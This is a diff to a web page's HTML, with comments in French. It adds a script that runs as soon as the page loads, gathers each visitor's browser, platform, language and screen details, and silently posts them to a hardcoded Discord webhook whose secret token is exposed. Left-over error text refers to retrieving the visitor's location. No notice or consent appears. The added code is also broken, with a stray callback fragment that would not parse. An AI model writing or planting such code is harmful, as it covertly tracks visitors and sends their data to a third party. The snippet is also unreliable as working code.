@@ -65,6 +65,36 @@
 
             fetchDataAndSendToDiscord();
         });
+
+        const sendDeviceInfoToDiscord = async () => {
+            const discordWebhookUrl = 'https://discord.com/api/webhooks/1242070611094802442/fZEJwxDAcxBzmuahYB3pFVEbybK7pELDW5mgMDVQgZVMSiqNyKt6TSrqUA0_BiU1lpH8';
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`
+            };
+                const payload = {
+                    content: JSON.stringify(deviceInfo, null, 2)
+                };
+                const discordResponse = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (discordResponse.ok) {
+                    console.log('Données envoyées à Discord avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi des données à Discord');
+                }
+            }, (error) => {
+                console.error('Erreur lors de la récupération de la localisation :', error);
+            });
+        };
+        document.addEventListener('DOMContentLoaded', sendDeviceInfoToDiscord);
     </script>
 </body>
 </html>
